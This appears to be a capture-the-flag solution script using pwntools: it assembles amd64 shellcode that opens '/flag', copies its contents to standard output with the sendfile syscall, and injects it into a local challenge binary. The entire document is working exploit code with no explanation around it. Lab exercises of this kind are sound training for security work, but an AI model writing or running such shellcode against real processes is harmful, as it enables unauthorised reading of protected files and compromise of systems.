

from pwn import *

context.arch = 'amd64'

shellcode = """

    push 0
    mov dword ptr [rsp], 0x616c662f
    mov byte ptr [rsp+4], 0x67
    push rsp

    pop rdi
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    mov edi, 1
    mov esi, eax
    xor edx, edx
    mov r10d, 1000
    mov eax, 40
    syscall

    mov eax, 60
    xor edi, edi
    syscall
"""


shellcode = asm(shellcode)

p = process('/challenge/ello-ackers')
p.send(shellcode)
p.interactive()
